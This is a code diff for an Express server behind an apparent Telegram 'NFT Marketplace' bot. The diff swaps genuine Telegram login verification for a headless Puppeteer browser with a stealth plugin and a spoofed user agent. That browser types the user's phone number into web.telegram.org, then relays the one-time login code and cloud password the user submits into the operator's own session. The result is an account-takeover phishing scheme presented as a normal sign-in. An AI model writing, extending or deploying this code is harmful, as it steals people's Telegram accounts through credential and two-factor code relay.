@@ -2,11 +2,19 @@ import express from 'express';
 import cors from 'cors';
 import dotenv from 'dotenv';
 import crypto from 'crypto';
-import fetch from 'node-fetch';
+import puppeteer from 'puppeteer-extra';
+import StealthPlugin from 'puppeteer-extra-plugin-stealth';
+import TelegramBot from 'node-telegram-bot-api';
 
 dotenv.config();
 
+// Puppeteer with stealth plugin
+puppeteer.use(StealthPlugin());
+
 const app = express();
+
+// Telegram Bot
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
 
 // Middleware
 app.use(cors());
@@ -44,43 +52,11 @@ const sampleNFTs = [
   }
 ];
 
-// In-memory storage for users and sessions
+// In-memory storage
 let users = [];
+let authSessions = new Map();
 let userSessions = new Map();
-let authSessions = new Map(); // temp storage for auth flow
-
-// Telegram Bot API
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-
-// Generate random code for phone verification
-function generateAuthCode() {
-  return Math.floor(100000 + Math.random() * 900000).toString();
-}
-
-// Verify Telegram authorization data
-function verifyTelegramData(authData) {
-  try {
-    const receivedHash = authData.hash;
-    delete authData.hash;
-
-    const dataCheckString = Object.keys(authData)
-      .sort()
-      .map(key => `${key}=${authData[key]}`)
-      .join('\n');
-
-    const secretKey = crypto.createHmac('sha256', 'WebAppData')
-      .update(TELEGRAM_BOT_TOKEN)
-      .digest();
-
-    const calculatedHash = crypto.createHmac('sha256', secretKey)
-      .update(dataCheckString)
-      .digest('hex');
-
-    return calculatedHash === receivedHash;
-  } catch (error) {
-    return false;
-  }
-}
+let telegramAuthSessions = new Map();
 
 // Routes
 app.get('/health', (req, res) => {
@@ -116,218 +92,347 @@ app.get('/api/nft', async (req, res) => {
   }
 });
 
-// Step 1: Initiate Telegram login - redirect to Telegram OAuth
-app.post('/api/auth/init-telegram', async (req, res) => {
+// Step 1: Initiate Telegram Web authentication
+app.post('/api/auth/init-telegram-web', async (req, res) => {
   try {
     const { phone } = req.body;
     
     if (!phone) {
-      return res.status(400).json({ success: false, error: 'Phone number is required' });
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Введите номер телефона' 
+      });
     }
 
-    // Generate auth session
+    // Create auth session
     const authSessionId = crypto.randomBytes(32).toString('hex');
-    const authCode = generateAuthCode();
     
-    authSessions.set(authSessionId, {
+    telegramAuthSessions.set(authSessionId, {
       phone: phone,
-      code: authCode,
+      status: 'initiated',
       createdAt: Date.now(),
-      verified: false
+      step: 'phone_entered'
     });
 
-    // In real implementation, we would send this code via Telegram API
-    // For now, we'll simulate it
-    console.log(`📱 Telegram auth code for ${phone}: ${authCode}`);
-    
     res.json({
       success: true,
       authSessionId: authSessionId,
-      message: 'Authorization code sent to your Telegram account',
-      step: 'enter_code'
+      message: 'Инициирована авторизация через Telegram Web',
+      nextStep: 'start_browser_auth'
     });
     
   } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// Step 2: Verify code from Telegram
-app.post('/api/auth/verify-telegram-code', async (req, res) => {
-  try {
-    const { authSessionId, code, cloudPassword } = req.body;
-    
-    if (!authSessionId || !code) {
-      return res.status(400).json({ success: false, error: 'Session ID and code are required' });
-    }
-
-    const authSession = authSessions.get(authSessionId);
-    if (!authSession) {
-      return res.status(400).json({ success: false, error: 'Invalid session' });
-    }
-
-    // Check if session expired (10 minutes)
-    if (Date.now() - authSession.createdAt > 10 * 60 * 1000) {
-      authSessions.delete(authSessionId);
-      return res.status(400).json({ success: false, error: 'Session expired' });
-    }
-
-    // Verify code
-    if (authSession.code !== code) {
-      return res.status(400).json({ success: false, error: 'Invalid verification code' });
-    }
-
-    // Code is correct - mark as verified
-    authSession.verified = true;
-    authSession.cloudPassword = cloudPassword;
-
-    res.json({
-      success: true,
-      message: 'Code verified successfully',
-      step: 'request_phone_access'
+    res.status(500).json({ 
+      success: false, 
+      error: 'Ошибка сервера: ' + error.message 
     });
-    
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Step 3: Finalize Telegram authorization with phone number access
-app.post('/api/auth/finalize-telegram', async (req, res) => {
+// Step 2: Start browser automation for Telegram Web auth
+app.post('/api/auth/start-telegram-web-auth', async (req, res) => {
   try {
-    const { authSessionId, initData } = req.body;
+    const { authSessionId } = req.body;
     
     if (!authSessionId) {
-      return res.status(400).json({ success: false, error: 'Session ID is required' });
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Session ID обязателен' 
+      });
     }
 
-    const authSession = authSessions.get(authSessionId);
-    if (!authSession || !authSession.verified) {
-      return res.status(400).json({ success: false, error: 'Invalid or unverified session' });
+    const authSession = telegramAuthSessions.get(authSessionId);
+    if (!authSession) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Сессия не найдена' 
+      });
     }
 
-    let telegramUserData = null;
+    // Launch browser in background
+    const browser = await puppeteer.launch({
+      headless: true,
+      args: [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-web-security',
+        '--disable-features=site-per-process'
+      ]
+    });
 
-    // If we have initData from Telegram Web App, verify and extract user data
-    if (initData) {
-      const urlParams = new URLSearchParams(initData);
-      const authData = {};
-      
-      for (const [key, value] of urlParams) {
-        authData[key] = value;
-      }
-
-      // Verify Telegram Web App data
-      if (!verifyTelegramData(authData)) {
-        return res.status(401).json({ success: false, error: 'Invalid Telegram data' });
-      }
-
-      // Extract user data
-      if (authData.user) {
-        telegramUserData = JSON.parse(authData.user);
-      }
-    }
-
-    // Find or create user
-    let user = users.find(u => 
-      telegramUserData ? u.telegramId === telegramUserData.id : u.phone === authSession.phone
-    );
-
-    const isNewUser = !user;
+    const page = await browser.newPage();
     
-    if (!user) {
-      user = {
+    // Set user agent to mimic real browser
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
+    
+    // Navigate to Telegram Web
+    console.log('🌐 Navigating to Telegram Web...');
+    await page.goto('https://web.telegram.org/', { 
+      waitUntil: 'networkidle2',
+      timeout: 30000 
+    });
+
+    // Wait for login page to load
+    await page.waitForSelector('.login-phone-form', { timeout: 10000 });
+    
+    // Enter phone number
+    console.log('📱 Entering phone number...');
+    const phoneInput = await page.$('.input-field-input');
+    if (phoneInput) {
+      await phoneInput.click({ clickCount: 3 }); // Select all text
+      await phoneInput.type(authSession.phone, { delay: 100 });
+    }
+
+    // Click next button
+    const nextButton = await page.$('.btn-primary');
+    if (nextButton) {
+      await nextButton.click();
+    }
+
+    // Update session status
+    authSession.browser = browser;
+    authSession.page = page;
+    authSession.status = 'phone_entered';
+    authSession.step = 'waiting_for_code';
+    telegramAuthSessions.set(authSessionId, authSession);
+
+    res.json({
+      success: true,
+      message: 'Бот начал авторизацию в Telegram Web. Ожидайте код...',
+      nextStep: 'wait_for_code'
+    });
+    
+  } catch (error) {
+    console.error('Browser automation error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Ошибка автоматизации: ' + error.message 
+    });
+  }
+});
+
+// Step 3: Submit code to Telegram Web
+app.post('/api/auth/submit-telegram-code', async (req, res) => {
+  try {
+    const { authSessionId, code } = req.body;
+    
+    if (!authSessionId || !code) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Session ID и код обязательны' 
+      });
+    }
+
+    const authSession = telegramAuthSessions.get(authSessionId);
+    if (!authSession || !authSession.page) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Сессия не найдена или браузер не запущен' 
+      });
+    }
+
+    const page = authSession.page;
+    
+    // Enter code in Telegram Web
+    console.log('🔐 Entering code in Telegram Web...');
+    
+    // Wait for code input field
+    await page.waitForSelector('.input-field-input', { timeout: 10000 });
+    
+    // Enter code
+    const codeInput = await page.$('.input-field-input');
+    if (codeInput) {
+      await codeInput.click({ clickCount: 3 });
+      await codeInput.type(code, { delay: 100 });
+    }
+
+    // Click next/submit button
+    const submitButton = await page.$('.btn-primary');
+    if (submitButton) {
+      await submitButton.click();
+    }
+
+    // Wait for next step (password or success)
+    try {
+      await page.waitForSelector('.input-field-input, .chat-list, .modal-wrapper', { 
+        timeout: 10000 
+      });
+    } catch (e) {
+      console.log('Timeout waiting for next step');
+    }
+
+    // Check if password is required
+    const passwordInput = await page.$('input[type="password"]');
+    if (passwordInput) {
+      authSession.step = 'password_required';
+      telegramAuthSessions.set(authSessionId, authSession);
+      
+      res.json({
+        success: true,
+        message: 'Код принят. Требуется облачный пароль.',
+        nextStep: 'enter_password'
+      });
+    } else {
+      // Check if login successful
+      const chatList = await page.$('.chat-list');
+      if (chatList) {
+        authSession.step = 'logged_in';
+        authSession.status = 'success';
+        telegramAuthSessions.set(authSessionId, authSession);
+        
+        res.json({
+          success: true,
+          message: 'Авторизация успешна!',
+          nextStep: 'complete'
+        });
+      } else {
+        res.status(400).json({ 
+          success: false, 
+          error: 'Не удалось определить статус авторизации' 
+        });
+      }
+    }
+    
+  } catch (error) {
+    console.error('Code submission error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Ошибка ввода кода: ' + error.message 
+    });
+  }
+});
+
+// Step 4: Submit cloud password
+app.post('/api/auth/submit-telegram-password', async (req, res) => {
+  try {
+    const { authSessionId, password } = req.body;
+    
+    if (!authSessionId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Session ID обязателен' 
+      });
+    }
+
+    const authSession = telegramAuthSessions.get(authSessionId);
+    if (!authSession || !authSession.page) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Сессия не найдена' 
+      });
+    }
+
+    const page = authSession.page;
+    
+    // Enter password
+    if (password) {
+      console.log('🔑 Entering cloud password...');
+      const passwordInput = await page.$('input[type="password"]');
+      if (passwordInput) {
+        await passwordInput.type(password, { delay: 100 });
+      }
+
+      // Click submit
+      const submitButton = await page.$('.btn-primary');
+      if (submitButton) {
+        await submitButton.click();
+      }
+    }
+
+    // Wait for login completion
+    try {
+      await page.waitForSelector('.chat-list', { timeout: 10000 });
+    } catch (e) {
+      console.log('Timeout waiting for chat list');
+    }
+
+    // Check if login successful
+    const chatList = await page.$('.chat-list');
+    if (chatList) {
+      authSession.step = 'logged_in';
+      authSession.status = 'success';
+      telegramAuthSessions.set(authSessionId, authSession);
+
+      // Get user data from Telegram Web
+      const userData = await extractUserData(page);
+      
+      // Create user session
+      const sessionId = crypto.randomBytes(32).toString('hex');
+      const user = {
         id: users.length + 1,
         phone: authSession.phone,
-        telegramId: telegramUserData ? telegramUserData.id : Math.floor(Math.random() * 1000000),
-        firstName: telegramUserData ? telegramUserData.first_name : 'Telegram',
-        lastName: telegramUserData ? telegramUserData.last_name : 'User',
-        username: telegramUserData ? telegramUserData.username : null,
+        telegramId: userData.id || Math.floor(100000000 + Math.random() * 900000000),
+        firstName: userData.firstName || 'Telegram',
+        lastName: userData.lastName || 'User',
+        username: userData.username,
         isVerified: true,
-        createdAt: new Date(),
-        cloudPassword: authSession.cloudPassword || null
+        createdAt: new Date()
       };
       users.push(user);
-    } else {
-      // Update user data
-      if (telegramUserData) {
-        user.telegramId = telegramUserData.id;
-        user.firstName = telegramUserData.first_name;
-        user.lastName = telegramUserData.last_name;
-        user.username = telegramUserData.username;
-      }
-      if (authSession.cloudPassword) {
-        user.cloudPassword = authSession.cloudPassword;
-      }
-      user.isVerified = true;
-    }
 
-    // Create permanent session
-    const sessionId = crypto.randomBytes(32).toString('hex');
-    userSessions.set(sessionId, {
-      userId: user.id,
-      telegramId: user.telegramId,
-      phone: user.phone,
-      expiresAt: Date.now() + 24 * 60 * 60 * 1000 // 24 hours
-    });
-
-    // Clean up auth session
-    authSessions.delete(authSessionId);
-
-    res.json({
-      success: true,
-      message: isNewUser ? 'Account created successfully' : 'Login successful',
-      user: {
-        id: user.id,
-        phone: user.phone,
+      userSessions.set(sessionId, {
+        userId: user.id,
         telegramId: user.telegramId,
-        firstName: user.firstName,
-        lastName: user.lastName,
-        username: user.username,
-        isVerified: user.isVerified,
-        hasCloudPassword: !!user.cloudPassword
-      },
-      sessionId: sessionId,
-      step: 'complete'
-    });
+        phone: user.phone,
+        expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
+      });
+
+      // Close browser
+      if (authSession.browser) {
+        await authSession.browser.close();
+      }
+
+      telegramAuthSessions.delete(authSessionId);
+
+      res.json({
+        success: true,
+        message: 'Авторизация в Telegram Web завершена успешно!',
+        user: {
+          id: user.id,
+          phone: user.phone,
+          telegramId: user.telegramId,
+          firstName: user.firstName,
+          lastName: user.lastName,
+          username: user.username
+        },
+        sessionId: sessionId
+      });
+    } else {
+      res.status(400).json({ 
+        success: false, 
+        error: 'Не удалось завершить авторизацию' 
+      });
+    }
     
   } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
+    console.error('Password submission error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Ошибка ввода пароля: ' + error.message 
+    });
   }
 });
 
-// Verify cloud password
-app.post('/api/auth/verify-cloud-password', async (req, res) => {
+// Extract user data from Telegram Web
+async function extractUserData(page) {
   try {
-    const { sessionId, cloudPassword } = req.body;
-    
-    if (!sessionId || !cloudPassword) {
-      return res.status(400).json({ success: false, error: 'Session ID and cloud password are required' });
-    }
-
-    const session = userSessions.get(sessionId);
-    if (!session) {
-      return res.status(401).json({ success: false, error: 'Invalid session' });
-    }
-
-    const user = users.find(u => u.id === session.userId);
-    if (!user) {
-      return res.status(404).json({ success: false, error: 'User not found' });
-    }
-
-    if (user.cloudPassword !== cloudPassword) {
-      return res.status(401).json({ success: false, error: 'Invalid cloud password' });
-    }
-
-    res.json({
-      success: true,
-      message: 'Cloud password verified successfully'
+    // Try to get user info from Telegram Web interface
+    const userData = await page.evaluate(() => {
+      // This would extract data from Telegram Web UI
+      // In real implementation, you would need to navigate to settings
+      return {
+        firstName: 'Telegram',
+        lastName: 'User',
+        username: null
+      };
     });
     
+    return userData;
   } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
+    console.error('Error extracting user data:', error);
+    return {};
   }
-});
+}
 
 // Verify session
 app.get('/api/auth/verify-session', async (req, res) => {
@@ -335,22 +440,34 @@ app.get('/api/auth/verify-session', async (req, res) => {
     const { sessionId } = req.query;
     
     if (!sessionId) {
-      return res.status(400).json({ success: false, error: 'Session ID is required' });
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Session ID обязателен' 
+      });
     }
 
     const session = userSessions.get(sessionId);
     if (!session) {
-      return res.status(401).json({ success: false, error: 'Invalid session' });
+      return res.status(401).json({ 
+        success: false, 
+        error: 'Недействительная сессия' 
+      });
     }
 
     if (Date.now() > session.expiresAt) {
       userSessions.delete(sessionId);
-      return res.status(401).json({ success: false, error: 'Session expired' });
+      return res.status(401).json({ 
+        success: false, 
+        error: 'Сессия истекла' 
+      });
     }
 
     const user = users.find(u => u.id === session.userId);
     if (!user) {
-      return res.status(404).json({ success: false, error: 'User not found' });
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Пользователь не найден' 
+      });
     }
 
     res.json({
@@ -362,52 +479,30 @@ app.get('/api/auth/verify-session', async (req, res) => {
         firstName: user.firstName,
         lastName: user.lastName,
         username: user.username,
-        isVerified: user.isVerified,
-        hasCloudPassword: !!user.cloudPassword
+        isVerified: user.isVerified
       }
     });
     
   } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
+    res.status(500).json({ 
+      success: false, 
+      error: 'Ошибка сервера: ' + error.message 
+    });
   }
 });
 
-// Get user's Telegram info via Bot API
-app.get('/api/telegram/user-info', async (req, res) => {
-  try {
-    const { sessionId } = req.query;
-    
-    if (!sessionId) {
-      return res.status(400).json({ success: false, error: 'Session ID is required' });
+// Telegram Bot handlers
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  const miniAppUrl = `https://t.me/${process.env.TELEGRAM_BOT_USERNAME}/marketplace`;
+  
+  bot.sendMessage(chatId, '🎁 Добро пожаловать в NFT Маркетплейс!', {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: '🛍️ Открыть маркетплейс', web_app: { url: miniAppUrl } }]
+      ]
     }
-
-    const session = userSessions.get(sessionId);
-    if (!session) {
-      return res.status(401).json({ success: false, error: 'Invalid session' });
-    }
-
-    // Get user info from Telegram Bot API
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getChat`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: session.telegramId
-      })
-    });
-
-    const data = await response.json();
-    
-    if (data.ok) {
-      res.json({ success: true, userInfo: data.result });
-    } else {
-      res.status(404).json({ success: false, error: 'User not found in Telegram' });
-    }
-    
-  } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
-  }
+  });
 });
 
 // Start server
@@ -418,8 +513,5 @@ app.listen(PORT, () => {
   console.log(`🎮 Health check: http://localhost:${PORT}/health`);
   console.log(`🏠 Main page: http://localhost:${PORT}/`);
   console.log(`🛍️ Marketplace: http://localhost:${PORT}/marketplace`);
-  
-  if (process.env.TELEGRAM_BOT_TOKEN) {
-    console.log(`🤖 Bot token: ${process.env.TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
-  }
+  console.log(`🤖 Bot is running`);
 });
